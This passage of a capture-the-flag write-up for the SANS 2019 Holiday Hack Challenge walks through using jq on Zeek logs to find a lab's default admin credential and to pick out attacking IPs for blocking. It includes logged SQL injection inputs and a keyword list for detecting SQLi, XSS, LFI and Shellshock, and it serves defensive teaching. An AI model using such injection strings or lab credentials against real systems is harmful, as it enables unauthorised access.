}&lt;/span&gt;
&lt;span class="go"&gt;{&amp;quot;ts&amp;quot;:&amp;quot;2019-04-04T20:41:01.862738Z&amp;quot;,&amp;quot;uid&amp;quot;:&amp;quot;CCuAk24L1kIclVKz4l&amp;quot;,&amp;quot;id.orig_h&amp;quot;:&amp;quot;192.168.144.130&amp;quot;,&amp;quot;id.orig_p&amp;quot;:55106,&amp;quot;id.resp_h&amp;quot;:&amp;quot;192.168.144.2&amp;quot;,&amp;quot;id.resp_p&amp;quot;:53,&amp;quot;proto&amp;quot;:&amp;quot;udp&amp;quot;,&amp;quot;service&amp;quot;:&amp;quot;dns&amp;quot;,&amp;quot;duration&amp;quot;:0.000602,&amp;quot;orig_bytes&amp;quot;:47,&amp;quot;resp_bytes&amp;quot;:63,&amp;quot;conn_state&amp;quot;:&amp;quot;SF&amp;quot;,&amp;quot;missed_bytes&amp;quot;:0,&amp;quot;history&amp;quot;:&amp;quot;Dd&amp;quot;,&amp;quot;orig_pkts&amp;quot;:1,&amp;quot;orig_ip_bytes&amp;quot;:75,&amp;quot;resp_pkts&amp;quot;:1,&amp;quot;resp_ip_bytes&amp;quot;:91}&lt;/span&gt;
&lt;span class="go"&gt;{&amp;quot;ts&amp;quot;:&amp;quot;2019-04-04T20:42:09.277476Z&amp;quot;,&amp;quot;uid&amp;quot;:&amp;quot;CRRCaj4bvzUJRRpmR6&amp;quot;,&amp;quot;id.orig_h&amp;quot;:&amp;quot;192.168.144.130&amp;quot;,&amp;quot;id.orig_p&amp;quot;:59679,&amp;quot;id.resp_h&amp;quot;:&amp;quot;192.168.144.2&amp;quot;,&amp;quot;id.resp_p&amp;quot;:53,&amp;quot;proto&amp;quot;:&amp;quot;udp&amp;quot;,&amp;quot;service&amp;quot;:&amp;quot;dns&amp;quot;,&amp;quot;duration&amp;quot;:0.000923,&amp;quot;orig_bytes&amp;quot;:34,&amp;quot;resp_bytes&amp;quot;:34,&amp;quot;conn_state&amp;quot;:&amp;quot;SF&amp;quot;,&amp;quot;missed_bytes&amp;quot;:0,&amp;quot;history&amp;quot;:&amp;quot;Dd&amp;quot;,&amp;quot;orig_pkts&amp;quot;:1,&amp;quot;orig_ip_bytes&amp;quot;:62,&amp;quot;resp_pkts&amp;quot;:1,&amp;quot;resp_ip_bytes&amp;quot;:62}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the &lt;code&gt;conn.log&lt;/code&gt; file is full of JSON data, one object per line, which
has the following interesting attributes:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;code&gt;id.resp_h&lt;/code&gt;, the destination IP&lt;/li&gt;
&lt;li&gt;&lt;code&gt;duration&lt;/code&gt;, the duration of the connection&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As the console suggests, we can use &lt;code&gt;jq&lt;/code&gt; to parse this data. Let's create
a &lt;code&gt;jq&lt;/code&gt; filter that will give us the destination IP with the longest
connection duration. You can use &lt;a class="reference external" href="https://stedolan.github.io/jq/manual/"&gt;this guide&lt;/a&gt;
to create your own filter.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@94a92f24ac33:~$&lt;/span&gt; jq -s &lt;span class="s1"&gt;&amp;#39;[.[] | {duration, &amp;quot;id.resp_h&amp;quot;}] | sort_by(.duration) | .[-1].&amp;quot;id.resp_h&amp;quot;&amp;#39;&lt;/span&gt; conn.log
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's break this down:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
jq -s [...] conn.log
&lt;/pre&gt;
&lt;p&gt;This calls &lt;code&gt;jq&lt;/code&gt; and tells it to treat the data in &lt;code&gt;conn.log&lt;/code&gt; as a
stream of data (since we have one JSON object per line, and not, say, a full
JSON object in the file).&lt;/p&gt;
&lt;pre class="literal-block"&gt;
[.[] | {duration, &amp;quot;id.resp_h&amp;quot;}]
&lt;/pre&gt;
&lt;p&gt;We create a list of JSON objects, based on the attributes &lt;code&gt;duration&lt;/code&gt; and
&lt;code&gt;id.resp_h&lt;/code&gt;. Note that we had to put the latter between double quotes,
because of the dot in the attribute's name.&lt;/p&gt;
&lt;pre class="literal-block"&gt;
| sort_by(.duration)
&lt;/pre&gt;
&lt;p&gt;We get the created list, and sort it by the &lt;code&gt;duration&lt;/code&gt; attribute.&lt;/p&gt;
&lt;pre class="literal-block"&gt;
| .[-1].&amp;quot;id.resp_h&amp;quot;
&lt;/pre&gt;
&lt;p&gt;We get the last element of the list (index -1) and query its &lt;code&gt;id.resp_h&lt;/code&gt;
attribute.&lt;/p&gt;
&lt;p&gt;Let's give this a go:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@94a92f24ac33:~$&lt;/span&gt; jq -s &lt;span class="s1"&gt;&amp;#39;[.[] | {duration, &amp;quot;id.resp_h&amp;quot;}] | sort_by(.duration) | .[-1].&amp;quot;id.resp_h&amp;quot;&amp;#39;&lt;/span&gt; conn.log
&lt;span class="go"&gt;&amp;quot;13.107.21.200&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;elf@94a92f24ac33:~$&lt;/span&gt; runtoanswer
&lt;span class="go"&gt;Loading, please wait......&lt;/span&gt;



&lt;span class="go"&gt;What is the destination IP address with the longes connection duration? 13.107.21.200&lt;/span&gt;



&lt;span class="go"&gt;Thank you for your analysis, you are spot-on.&lt;/span&gt;
&lt;span class="go"&gt;I would have been working on that until the early dawn.&lt;/span&gt;
&lt;span class="go"&gt;Now that you know the features of jq,&lt;/span&gt;
&lt;span class="go"&gt;You&amp;#39;ll be able to answer other challenges too.&lt;/span&gt;

&lt;span class="go"&gt;-Wunorse Openslae&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="filter-out-poisoned-sources-of-weather-data"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id42"&gt;Filter Out Poisoned Sources of Weather Data&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Inside the Sleigh Shop, we find the evil Tooth Fairy:&lt;/p&gt;
&lt;img alt="toothfairy.png" class="align-center" src="/images/sans-christmas-challenge-2019/toothfairy.png" /&gt;
&lt;p&gt;&lt;em&gt;The Tooth Fairy says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday
season.&lt;/p&gt;
&lt;p&gt;I hate how Santa is so beloved, but only works one day per year!&lt;/p&gt;
&lt;p&gt;He has all of the resources of the North Pole and the elves to help him
too.&lt;/p&gt;
&lt;p&gt;I run a solo operation, toiling year-round collecting deciduous bicuspids
and more from children.&lt;/p&gt;
&lt;p&gt;But I get nowhere near the gratitude that Santa gets. He needs to share his
holiday resources with the rest of us!&lt;/p&gt;
&lt;p&gt;But, although you found me, you haven’t foiled my plot!&lt;/p&gt;
&lt;p&gt;Santa’s sleigh will NOT be able to find its way.&lt;/p&gt;
&lt;p&gt;I will get my revenge and respect!&lt;/p&gt;
&lt;p&gt;I want my own holiday, National Tooth Fairy Day, to be the most popular
holiday on the calendar!!!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img alt="wunorse_openslaer.png" class="align-center" src="/images/sans-christmas-challenge-2019/wunorse_openslae.png" /&gt;
&lt;p&gt;&lt;em&gt;Wunorse Openslae says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hey, you know what? We've got a crisis here.&lt;/p&gt;
&lt;p&gt;You see, Santa's flight route is planned by a complex set of machine
learning algorithms which use available weather data.&lt;/p&gt;
&lt;p&gt;All the weather stations are reporting severe weather to Santa's Sleigh. I
think someone might be forging intentionally false weather data!&lt;/p&gt;
&lt;p&gt;I'm so flummoxed I can't even remember how to login!&lt;/p&gt;
&lt;p&gt;Hmm... Maybe the Zeek http.log could help us.&lt;/p&gt;
&lt;p&gt;I worry about LFI, XSS, and SQLi in the Zeek log - oh my!&lt;/p&gt;
&lt;p&gt;And I'd be shocked if there weren't some shell stuff in there too.&lt;/p&gt;
&lt;p&gt;I'll bet if you pick through, you can find some naughty data from naughty
hosts and block it in the firewall.&lt;/p&gt;
&lt;p&gt;If you find a log entry that definitely looks bad, try pivoting off other
unusual attributes in that entry to find more bad IPs.&lt;/p&gt;
&lt;p&gt;The sleigh's machine learning device (SRF) needs most of the malicious IPs
blocked in order to calculate a good route.&lt;/p&gt;
&lt;p&gt;Try not to block many legitimate weather station IPs as that could also
cause route calculation failure.&lt;/p&gt;
&lt;p&gt;Remember, when looking at JSON data, jq is the tool for you!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Alright, let's download this &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/http.log.gz"&gt;log file&lt;/a&gt;
and take a look inside.&lt;/p&gt;
&lt;p&gt;So, this file contains one big JSON object, and we must find traces of SQL
injections, XSS, local file inclusion, and shell shock exploits. When we have
identified at least 100 bad IPs, we can block them in the &lt;a class="reference external" href="https://srf.elfu.org/"&gt;Sleigh Route Finder&lt;/a&gt; so that Santa can calculate the correct route for
his present delivery.&lt;/p&gt;
&lt;p&gt;But first, how can we log into the Sleigh Route Finder website? We don't have
any credentials and Wunorse don't remember them. If we take a look at the
&lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf"&gt;quick start guide&lt;/a&gt;
we decrypted earlier, we find an interesting piece of information:&lt;/p&gt;
&lt;blockquote&gt;
The default login credentials should be changed on startup and can be found
in the readme in the ElfU Research Labs git repository.&lt;/blockquote&gt;
&lt;p&gt;I first spent some time trying to find this git repository. I performed DNS
bruteforce against the elfu.org domain, but didn't find anything interesting.
I also try to use &lt;a class="reference external" href="https://github.com/OJ/gobuster/"&gt;gobuster&lt;/a&gt; against the
&lt;a class="reference external" href="https://srf.elfu.org"&gt;https://srf.elfu.org&lt;/a&gt; website, but also to no avail. I then tried several
&lt;a class="reference external" href="https://www.owasp.org/index.php/Conduct_search_engine_discovery/reconnaissance_for_information_leakage_(OTG-INFO-001)"&gt;Google Dorks&lt;/a&gt;
to try and find this mysterious git repository, but the only thing I found
was this &lt;a class="reference external" href="https://downloads.elfu.org/LetterOfWintryMagic.pdf"&gt;weird letter&lt;/a&gt;
of Wintry Magic, that I could make no sense of.&lt;/p&gt;
&lt;p&gt;I then thought that maybe we could try to find login information in the Zeek
log file. Indeed, the different events have a &lt;code&gt;username&lt;/code&gt; and a
&lt;code&gt;password&lt;/code&gt; attribute. Maybe the login information we're looking for is
there? Let's build a &lt;code&gt;jq&lt;/code&gt; filter to find these information:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; jq &lt;span class="s1"&gt;&amp;#39;.[] | select(.username != &amp;quot;-&amp;quot;) | {username, password}&amp;#39;&lt;/span&gt; http.log
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;q1ki9&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;servlet&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;support&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;Admin&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;-r nessus&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;q1ki9&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;6666&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;6666&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;6666&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;&amp;#39; or &amp;#39;1=1&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;&amp;#39; or &amp;#39;1=1&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;&amp;#39; or &amp;#39;1=1&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;&amp;#39; or &amp;#39;1=1&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;root&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;comcomcom&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;(empty)&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;(empty)&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;(empty)&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;admin&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;username&amp;quot;: &amp;quot;(empty)&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;password&amp;quot;: &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Well, we can see the SQL injection attempts, but no useful credentials. Then,
I looked back at what was said in the quick start guide: the credentials are in
a readme file. So, let's look for readme files in the Zeek logs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; jq &lt;span class="s1"&gt;&amp;#39;.[] | select(.uri | test(&amp;quot;readme&amp;quot;; &amp;quot;i&amp;quot;)) | {host, uri, status_code}&amp;#39;&lt;/span&gt; http.log
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;host&amp;quot;: &amp;quot;srf.elfu.org&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;uri&amp;quot;: &amp;quot;/README.md&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;status_code&amp;quot;: 200&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;host&amp;quot;: &amp;quot;srf.elfu.org&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;uri&amp;quot;: &amp;quot;/README/&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;status_code&amp;quot;: 404&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;host&amp;quot;: &amp;quot;srf.elfu.org&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;uri&amp;quot;: &amp;quot;/cgi-bin/README.TXT&amp;quot;,&lt;/span&gt;
&lt;span class="go"&gt;  &amp;quot;status_code&amp;quot;: 404&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There's only one entry with an HTTP status code of 200. Let's try to download
the file &lt;a class="reference external" href="https://srf.elfu.org/README.md"&gt;https://srf.elfu.org/README.md&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Sled-O-Matic - Sleigh Route Finder Web API

### Installation

```
sudo apt install python3-pip
sudo python3 -m pip install -r requirements.txt
```

#### Running:

`python3 ./srfweb.py`

#### Logging in:

You can login using the default admin pass:

&lt;span class="hll"&gt;`admin 924158F9522B3744F5FCD4D10FAC4356`
&lt;/span&gt;
However, it&amp;#39;s recommended to change this in the sqlite db to something custom
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hurray, we have our credentials! Now we just have to find the malicious IP
addresses to block.&lt;/p&gt;
&lt;p&gt;By taking a look at the logs, we can search for the following terms for the
different attacks:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;For SQLi : &lt;code&gt;SELECT&lt;/code&gt; and &lt;code&gt;or&amp;nbsp;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;For XSS : &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;For LFI : &lt;code&gt;/etc&lt;/code&gt;, &lt;code&gt;../&lt;/code&gt;, and &lt;code&gt;./.&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;For Shell-shock : &lt;code&gt;()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We'll look for these values in the &lt;code&gt;uri&lt;/code&gt;, &lt;code&gt;user_agent&lt;/code&gt;,
&lt;code&gt;username&lt;/code&gt;, and &lt;code&gt;host&lt;/code&gt; attributes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; jq &lt;span class="s1"&gt;&amp;#39;.[] | select((.uri,.user_agent,.username,.host | test(&amp;quot;SELECT|&amp;lt;script&amp;gt;|\\(\\)|\\.\\./|\\./\\.|/etc|or &amp;quot;)))&amp;#39;&lt;/span&gt; http.log &amp;gt; attacks.json
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see our regexp that we had to escape the &lt;code&gt;()&lt;/code&gt; and the &lt;code&gt;.&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Alright, how many different IP addresses is that?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep id.orig_h attacks.json &lt;span class="p"&gt;|&lt;/span&gt; sort -u &lt;span class="p"&gt;|&lt;/span&gt; wc -l
&lt;span class="go"&gt;62&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, pretty far from the 100 necessary IP addresses. Wunorse Openslae advises
us to look at the attributes of known bad events. Maybe we can try to identify
other bad IP addresses by using the known bad user agents: it's possible that
a known bad agent is using several IP addresses. We can try to identify them
by their user agents.&lt;/p&gt;
&lt;p&gt;First, let's create a list of known bad user agents. We'll remove user agents
that were used to perform attacks such as SQL injections or Shell-shock.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep user_agent attacks.json &lt;span class="p"&gt;|&lt;/span&gt; cut -d: -f &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d&lt;span class="s1"&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt; -f &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort -u &lt;span class="p"&gt;|&lt;/span&gt; grep -vE &lt;span class="s1"&gt;&amp;#39;SELECT|\(\)|google&amp;#39;&lt;/span&gt; &amp;gt; bad_user_agents.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, let's query our events matching our bad user agents:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; user_agent&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; jq &lt;span class="s1"&gt;&amp;#39;.[] | select(.user_agent == &amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$user_agent&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;quot;)&amp;#39;&lt;/span&gt; http.log&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt; &amp;lt; bad_user_agents.txt &amp;gt; malicious_events_by_user_agents.json
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, let's extract our unique IP addresses:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat attacks.json malicious_events_by_user_agents.json&lt;span class="p"&gt;|&lt;/span&gt; jq -s &lt;span class="s1"&gt;&amp;#39;.[] | .&amp;quot;id.orig_h&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort -u &lt;span class="p"&gt;|&lt;/span&gt; tr -d &lt;span class="s1"&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;0.216.249.31&lt;/span&gt;
&lt;span class="go"&gt;10.122.158.57&lt;/span&gt;
&lt;span class="go"&gt;10.155.246.29&lt;/span&gt;
&lt;span class="go"&gt;102.143.16.184&lt;/span&gt;
&lt;span class="go"&gt;103.235.93.133&lt;/span&gt;
&lt;span class="go"&gt;104.179.109.113&lt;/span&gt;
&lt;span class="go"&gt;106.132.195.153&lt;/span&gt;
&lt;span class="go"&gt;106.93.213.219&lt;/span&gt;
&lt;span class="go"&gt;111.81.145.191&lt;/span&gt;
&lt;span class="go"&gt;116.116.98.205&lt;/span&gt;
&lt;span class="go"&gt;118.196.230.170&lt;/span&gt;
&lt;span class="go"&gt;118.26.57.38&lt;/span&gt;
&lt;span class="go"&gt;121.144.25.34&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can now paste our list of IPs to the SRF web site:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat attacks.json malicious_events_by_user_agents_bad_regexp.json&lt;span class="p"&gt;|&lt;/span&gt; jq -s &lt;span class="s1"&gt;&amp;#39;.[] | .&amp;quot;id.orig_h&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort -u &lt;span class="p"&gt;|&lt;/span&gt; tr -d &lt;span class="s1"&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; paste -s -d,
&lt;span class="go"&gt;0.216.249.31,10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,121.144.25.34,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,13.39.153.254,135.203.243.43,135.32.99.116,136.59.204.152,140.60.154.239[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We submit it, aaaand:&lt;/p&gt;
&lt;img alt="srf_route_id.png" class="align-center" src="/images/sans-christmas-challenge-2019/srf_route_id.png" /&gt;
&lt;p&gt;We get a correct route ID!&lt;/p&gt;
&lt;p&gt;Now, during the write-up, I tried submitting the exact same IP list, and it
didn't work, soooo whaddup SANS?&lt;/p&gt;
&lt;p&gt;Anyway, we can now access the Bell Tower:&lt;/p&gt;
&lt;img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You did it! Thank you! You uncovered the sinister plot to destroy the
holiday season!&lt;/p&gt;
&lt;p&gt;Through your diligent efforts, we’ve brought the Tooth Fairy to justice and
saved the holidays!&lt;/p&gt;
&lt;p&gt;Ho Ho Ho!&lt;/p&gt;
&lt;p&gt;The more I laugh, the more I fill with glee.&lt;/p&gt;
&lt;p&gt;And the more the glee,&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://www.youtube.com/watch?v=yNHRXNvFmZ8"&gt;The more I'm a merrier me!&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Merry Christmas and Happy Holidays.&lt;/p&gt;
&lt;/blockquote&gt;
